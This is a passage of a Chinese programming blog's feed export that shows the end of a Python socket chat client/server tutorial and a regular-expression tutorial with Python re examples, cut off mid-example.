class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            data = self.tcp.recv(<span class="number">4096</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(data):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            print(<span class="string">"\n]"</span>,data.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    tcp = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    talkApp = Client(tcp)</span><br><span class="line">    print(<span class="string">"...Conversation established..."</span>)</span><br><span class="line">    sendThread = threading.Thread(target=talkApp.sendData, daemon=<span class="keyword">True</span>)</span><br><span class="line">    recvThread = threading.Thread(target=talkApp.recvData, daemon=<span class="keyword">True</span>)</span><br><span class="line">    sendThread.start()</span><br><span class="line">    recvThread.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sleep(<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    tcp.close()</span><br><span class="line">    print(<span class="string">"...Client is closed..."</span>)</span><br></pre></td></tr></table></figure><p><code>服务端</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">""</span></span><br><span class="line">PORT = <span class="number">1234</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">server</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,tcp)</span>:</span></span><br><span class="line">        self.tcp = tcp</span><br><span class="line">        self.tcp.bind((HOST, PORT))</span><br><span class="line">        self.tcp.listen(<span class="number">5</span>)</span><br><span class="line">        self.clientsock, self.clientaddr = self.tcp.accept()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sendData</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            data = input(<span class="string">"&gt; "</span>)</span><br><span class="line">            self.clientsock.sendall(data.encode())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recvData</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            data = self.clientsock.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(data):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            print(<span class="string">"\n]"</span>,data.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    tcp = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    talkApp = server(tcp)</span><br><span class="line">    print(<span class="string">"...Conversation established..."</span>)</span><br><span class="line">    sendThread = threading.Thread(target=talkApp.sendData, daemon=<span class="keyword">True</span>)</span><br><span class="line">    recvThread = threading.Thread(target=talkApp.recvData, daemon=<span class="keyword">True</span>)</span><br><span class="line">    sendThread.start()</span><br><span class="line">    recvThread.start()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sleep(<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    tcp.close()</span><br><span class="line">    print(<span class="string">"...Server is closed..."</span>)</span><br></pre></td></tr></table></figure><h2 id="0x03-参考文章"><a class="markdownIt-Anchor" href="#0x03-参考文章"></a> 0x03 参考文章</h2><ul><li><p><a href="https://www.cnblogs.com/aylin/p/5572104.html" target="_blank" rel="noopener">python之socket编程</a></p></li><li><p><a href="https://keelii.com/2018/09/24/socket-programming-in-python/" target="_blank" rel="noopener">[译]Python 中的 Socket 编程（指南）</a></p></li><li><p><a href="https://www.cnblogs.com/dolphinX/p/3460545.html" target="_blank" rel="noopener">简单理解Socket</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-什么是socket&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x00-什么是socket&quot;&gt;&lt;/a&gt; 0x00 什么是Socket？&lt;/h2&gt;
&lt;h3 id=&quot;1简介&quot;&gt;&lt;a class=&quot;markdownIt-Anch
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式学习总结</title>
    <link href="https://muzibing.github.io/2020/09/17/2020.09.17%EF%BC%88153%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/09/17/2020.09.17（153）/</id>
    <published>2020-09-16T16:00:00.000Z</published>
    <updated>2020-09-17T12:30:42.830Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-正则表达式"><a class="markdownIt-Anchor" href="#0x00-正则表达式"></a> 0x00 正则表达式</h3><h4 id="1为什么使用正则表达式"><a class="markdownIt-Anchor" href="#1为什么使用正则表达式"></a> 1.为什么使用正则表达式？</h4><blockquote><p>典型的搜索和替换操作要求您提供与预期的搜索结果匹配的确切文本。虽然这种技术对于对静态文本执行简单搜索和替换任务可能已经足够了，但它缺乏灵活性，若采用这种方法搜索动态文本，即使不是不可能，至少也会变得很困难。</p></blockquote><p>通过使用正则表达式，可以：</p><ul><li>测试字符串内的模式。<br>例如，可以测试输入字符串，以查看字符串内是否出现电话号码模式或信用卡号码模式。这称为数据验证。</li><li>替换文本。<br>可以使用正则表达式来识别文档中的特定文本，完全删除该文本或者用其他文本替换它。</li><li>基于模式匹配从字符串中提取子字符串。<br>可以查找文档内或输入域内特定的文本。</li></ul><blockquote><p>例如，您可能需要搜索整个网站，删除过时的材料，以及替换某些 HTML 格式标记。在这种情况下，可以使用正则表达式来确定在每个文件中是否出现该材料或该 HTML 格式标记。此过程将受影响的文件列表缩小到包含需要删除或更改的材料的那些文件。然后可以使用正则表达式来删除过时的材料。最后，可以使用正则表达式来搜索和替换标记。</p></blockquote><h3 id="0x01-语法"><a class="markdownIt-Anchor" href="#0x01-语法"></a> 0x01 语法</h3><blockquote><p>正则表达式(regular expression)描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。</p></blockquote><h4 id="1普通字符"><a class="markdownIt-Anchor" href="#1普通字符"></a> 1.普通字符</h4><p><code>[ABC]</code></p><blockquote><p>匹配 <strong>[…]</strong> 中的所有字符，例如 <strong>[aeiou]</strong> 匹配字符串 “google runoob taobao” 中所有的 e o u a 字母。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"abcdef1234"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[safc]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'f'</span>]</span><br></pre></td></tr></table></figure><p><code>[^ABC]</code></p><blockquote><p>匹配除了 <strong>[…]</strong> 中字符的所有字符，例如 <strong>[^aeiou]</strong> 匹配字符串 “google runoob taobao” 中除了 e o u a 字母的所有字母。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"abcdef1234"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[^safc]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'b'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>]</span><br></pre></td></tr></table></figure><p><code>[A-Z]</code></p><blockquote><p>[A-Z] 表示一个区间，匹配所有大写字母，[a-z] 表示所有小写字母。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"abcdef1234"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[A-Z]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><p><code>[a-zA-Z]</code></p><blockquote><p>匹配所有大、小写字母</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"abcdef1234"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[a-zA-Z]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>]</span><br></pre></td></tr></table></figure><p><code>[a-zA-Z0-9]</code></p><blockquote><p>匹配所有大、小写字母以及数字</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"abcdef1234"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[a-zA-Z0-9]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>]</span><br></pre></td></tr></table></figure><p><code>.</code></p><blockquote><p>匹配除换行符（\n、\r）之外的任何单个字符，相等于 <code>[^\n\r]</code>。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = r<span class="string">"abcdef\n12\r34"</span><span class="comment"># 加上r' '相当于对字符串的原始字符，相当于\n没有被转义</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"."</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'\\'</span>, <span class="string">'n'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'\\'</span>, <span class="string">'r'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; s = <span class="string">"abcdef\n12\r34"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"."</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'\r'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>]</span><br></pre></td></tr></table></figure><p><code>[\s\S]</code></p><blockquote><p>匹配所有。\s 是匹配所有空白符，包括换行，\S 非空白符，包括换行。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"abcdef\n12\r   34"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"\s"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'\n'</span>, <span class="string">'\r'</span>, <span class="string">' '</span>, <span class="string">' '</span>, <span class="string">' '</span>]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"\S"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>]</span><br></pre></td></tr></table></figure><p><code>[\w\W]</code></p><blockquote><p><code>\w</code>匹配字母、数字、下划线。等价于 <code>[A-Za-z0-9_]</code>，<code>[\W]</code>相当于<code>[^A-Za-z0-9_]</code></p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"abcdef\n12\r   34"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"\w"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"\W"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'\n'</span>, <span class="string">'\r'</span>, <span class="string">' '</span>, <span class="string">' '</span>, <span class="string">' '</span>]</span><br></pre></td></tr></table></figure><h4 id="2非打印字符"><a class="markdownIt-Anchor" href="#2非打印字符"></a> 2.非打印字符</h4><blockquote><p>非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列</p></blockquote><p><code>\cx</code></p><blockquote><p>匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符</p></blockquote><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>\cx</td><td>匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。<br>x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。</td></tr><tr><td>\f</td><td>匹配一个换页符。等价于 \x0c 和 \cL。</td></tr><tr><td>\n</td><td>匹配一个换行符。等价于 \x0a 和 \cJ。</td></tr><tr><td>\r</td><td>匹配一个回车符。等价于 \x0d 和 \cM。</td></tr><tr><td>\s</td><td>匹配任何空白字符，包括空格、制表符、换页符等等。<br>等价于 [ \f\n\r\t\v]。注意 Unicode 正则表达式会匹配全角空格符。</td></tr><tr><td>\S</td><td>匹配任何非空白字符。等价于<code>[^ \f\n\r\t\v]</code>。</td></tr><tr><td>\t</td><td>匹配一个制表符。等价于 \x09 和 \cI。</td></tr><tr><td>\v</td><td>匹配一个垂直制表符。等价于 \x0b 和 \cK。</td></tr></tbody></table><h4 id="3特殊字符"><a class="markdownIt-Anchor" href="#3特殊字符"></a> 3.特殊字符</h4><blockquote><p>所谓特殊字符，就是一些有特殊含义的字符，如上面说的 <strong>runoo*b</strong> 中的 *****，简单的说就是表示任何字符串的意思。如果要查找字符串中的 ***** 符号，则需要对 ***** 进行转义，即在其前加一个 ****: <strong>runo*ob</strong> 匹配 runo*ob。</p><p>许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符&quot;转义&quot;，即，将反斜杠字符**** 放在它们前面。下表列出了正则表达式中的特殊字符：</p></blockquote><p><code>$</code></p><blockquote><p>匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 ​$ 字符本身，请使用 $</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"abcdef\n12\r34\n"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"$"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">''</span>, <span class="string">''</span>]</span><br></pre></td></tr></table></figure><p><code>( )</code></p><blockquote><p>标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"root@()"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">''</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"root@(.)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'1'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"root@(.+)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'192.168.132.1'</span>]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; re.search(r,s).group()</span><br><span class="line"><span class="string">'root@192.168.132.1'</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"root@(\w)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.search(r,s).group()</span><br><span class="line"><span class="string">'root@1'</span></span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'1'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"root@(\w+)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'192'</span>]</span><br></pre></td></tr></table></figure><p><code>*</code>：0次或多次</p><blockquote><p>匹配前面的子表达式<strong>零次</strong>或<strong>多次</strong>。要匹配 * 字符，请使用 *。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"root@www.baidu.com"</span></span><br><span class="line">&gt;&gt;&gt; s2 = <span class="string">"root@baidu.com"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"\w+@(\w*.+)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'www.baidu.com'</span>]</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s2)</span><br><span class="line">[<span class="string">'baidu.com'</span>]</span><br></pre></td></tr></table></figure><p><code>+</code>：1次或多次</p><blockquote><p>匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 +。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"root@www.baidu.com"</span></span><br><span class="line">&gt;&gt;&gt; s2 = <span class="string">"root@baidu.com"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"\w+@(\w*.+)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'www.baidu.com'</span>]</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s2)</span><br><span class="line">[<span class="string">'baidu.com'</span>]</span><br></pre></td></tr></table></figure><p><code>?</code>：子表达式的0次或1次</p><blockquote><p>匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 \?。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"root@www.baidu.com"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"@(\w)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'w'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"@(\w)+"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'w'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"@(\w+)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'www'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"@(\w?)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'w'</span>]</span><br></pre></td></tr></table></figure><p><code>.</code></p><blockquote><p>匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 \. 。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"root@www.baidu.com"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"."</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'r'</span>, <span class="string">'o'</span>, <span class="string">'o'</span>, <span class="string">'t'</span>, <span class="string">'@'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'.'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>, <span class="string">'i'</span>, <span class="string">'d'</span>, <span class="string">'u'</span>, <span class="string">'.'</span>, <span class="string">'c'</span>, <span class="string">'o'</span>, <span class="string">'m'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"root(.)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'@'</span>]</span><br></pre></td></tr></table></figure><p><code>[</code></p><blockquote><p>标记一个中括号表达式的开始。要匹配 [，请使用 \[。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"root@www.baidu.com"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[@]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'@'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[\w+]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'r'</span>, <span class="string">'o'</span>, <span class="string">'o'</span>, <span class="string">'t'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>, <span class="string">'i'</span>, <span class="string">'d'</span>, <span class="string">'u'</span>, <span class="string">'c'</span>, <span class="string">'o'</span>, <span class="string">'m'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[\w]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'r'</span>, <span class="string">'o'</span>, <span class="string">'o'</span>, <span class="string">'t'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>, <span class="string">'i'</span>, <span class="string">'d'</span>, <span class="string">'u'</span>, <span class="string">'c'</span>, <span class="string">'o'</span>, <span class="string">'m'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[\W]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'@'</span>, <span class="string">'.'</span>, <span class="string">'.'</span>]</span><br></pre></td></tr></table></figure><p><code>\</code></p><blockquote><p>将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\’ 匹配 “”，而 ‘(’ 则匹配 “(”。</p></blockquote><p><code>^</code></p><blockquote><p>匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合。要匹配 ^ 字符本身，请使用 \^。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"root@www.baidu.com"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"^"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">''</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[^\w]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'@'</span>, <span class="string">'.'</span>, <span class="string">'.'</span>]</span><br></pre></td></tr></table></figure><p><code>{</code></p><blockquote><p>标记限定符表达式的开始。要匹配 {，请使用 \{。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"root@www.baidu.com"</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"\w"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'r'</span>, <span class="string">'o'</span>, <span class="string">'o'</span>, <span class="string">'t'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>, <span class="string">'i'</span>, <span 